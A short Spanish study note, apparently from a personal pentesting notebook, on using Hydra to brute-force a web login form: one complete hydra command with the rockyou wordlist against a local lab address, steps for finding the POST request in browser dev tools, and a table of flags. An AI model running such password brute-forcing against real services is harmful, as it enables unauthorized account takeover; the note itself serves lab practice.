Herramienta para realizar fuerza bruta

##### Web
hydra -l admin -P /usr/share/wordlists/rockyou.txt 172.17.0.2 -s 3000 http-post-form "/login:{\"user\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:H=Content-Type\: application/json:F=Incorrect"

- Para sacar el httpo-post-form nos iremos a la web en el login escribiremos lo que sea y le daremos enter -- dev-tools -- Network -- Peticion post -- request y lo veremos
	![[Pasted image 20260515001459.png]]

| Parametro | Funcion                    |
| --------- | -------------------------- |
| -l        | Usuario especifico         |
| -L        | Lista de usuarios          |
| -p        | unica password             |
| -P        | Listado de password        |
| -s        | Para seleccionar el puerto |
